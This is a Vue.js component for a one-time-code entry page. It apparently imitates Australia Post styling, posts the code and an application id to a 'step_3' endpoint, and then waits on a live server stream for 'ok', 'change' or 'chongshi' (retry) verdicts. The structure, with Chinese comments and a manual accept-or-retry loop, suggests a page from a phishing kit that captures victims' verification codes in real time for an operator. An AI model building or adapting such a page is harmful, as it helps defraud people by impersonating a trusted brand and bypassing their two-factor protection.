<template>
  <div style="padding: 0 16px 0 16px">
    <p> We’ve sent a verification code to {{ phone_number }}</p>
    <!--    警告框-->
    <div class="checkout-error-container" v-show="warn_show">
      <ul class="list-unstyled alert alert-danger" id="tokenizationError">
        <v-icon color="#d61834" class="mr-3">mdi-alert</v-icon>
        <li>The verification code is wrong, we resend a verification code. Please try again.</li>
      </ul>
    </div>
    <label class="control-label col-sm-12" style="margin-bottom: 16px"> OTP Code </label>
    <small style="" class="has-error" v-show="alert_show">
      <v-icon small color="#bc111e" class="mr-1">mdi-alert</v-icon>
      Please enter a valid verification code.</small>
    <v-otp-input
        v-model="otp"
        type="number"
        length="6"
    ></v-otp-input>
    <button style="margin: 24px 0 50px 0" name="continue"
            class="ap-btn btn-block ap-btn-primary ap-big-button checkError" @click="submit_data">
      Submit
    </button>
    <v-overlay opacity="0.8" color="#ffffff" v-show="show_loading">
      <v-progress-circular
          indeterminate
          color="#ff0000"
          width="3"
          size="48"
      ></v-progress-circular>
    </v-overlay>
  </div>
</template>

<script>
import axios from "axios";
import api from '@/api/index'

export default {
  name: "OtpView",
  data: () => ({
    alert_show: false,
    show_loading: false,
    appid: localStorage.getItem("appid"),
    otp: '',
    phone_number: localStorage.getItem('phone'),
    warn_show: false,
  }),
  methods: {
    submit_data() {
      this.alert_show = false
      const url = api.step_3
      const params = new URLSearchParams();
      const post_data = [this.appid, this.otp]
      const post_name = ['appid', 'otp']
      if (this.appid !== '' && this.otp !== '') {
        this.show_loading = true
        for (let i in post_data) {
          params.append(post_name[i], post_data[i])
        }
        axios.post(url, params)
            .then(response => {
              if (response.data.status === 'ok') {
                this.check_otp_status()
              } else {
                this.show_loading = false
                this.alert_show = true
              }
            })
            .catch(error => {
              console.log(error)
              this.show_loading = false
            })
      } else {
        this.alert_show = true
      }
    },
    check_otp_status() {
      if ('EventSource' in window) {
        const url = api.check_otp_status + "?appid=" + this.appid;
        const source = new EventSource(url);
        // 服务器发送信息到客户端时，如果没有 event 字段，默认会触发 message 事件
        source.onmessage = (event) => {
          let data = event.data;
          if (data === 'ok') {
            source.close()
            this.$router.push({'name': 'thanks'})
          } else if (data === 'change') {
            source.close()
            this.show_loading = false
            this.otp = ''
            this.warn_show = true
          } else if (data === 'chongshi') {
            this.show_loading = false
            this.otp = ''
            this.warn_show = true
          }
        }
        // 连接异常时会触发 error 事件并自动重连
        source.onerror = (event) => {
          console.log(event);

        }
      }
    },
  },
}
</script>

<style scoped>

.alert {
  background-color: #f2d0d5;
  border-left: 3px solid #d61834;
  display: flex;
  align-items: flex-start;
  color: #212129;
  font-size: 14px;
}

label {
  font-weight: 700;
  padding-top: 24px;
  margin-bottom: 0;
  padding-bottom: 8px;
  text-align: left;
  padding-left: 0 !important;
  font-family: "AP_Type_Text_Bold", Arial, sans-serif;
}

.ap-big-button {
  height: 56px;
  line-height: 52px;
}

.ap-btn-primary {
  color: #fff;
  background-color: #dc1928;
  border: 1px solid #dc1928;
  border-radius: 8px;
}

.ap-btn {
  display: inline-block;
  margin-bottom: 0;
  text-align: center;
  white-space: nowrap;
  font-family: "AP_Type_Text_Medium", Arial, sans-serif;
  vertical-align: middle;
  touch-action: manipulation;
  cursor: pointer;
  background-image: none;
  border: 0;
  line-height: 40px;
  min-width: 180px;
  padding: 0 15px;
  font-size: 16px;
  border-radius: 8px;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
</style>
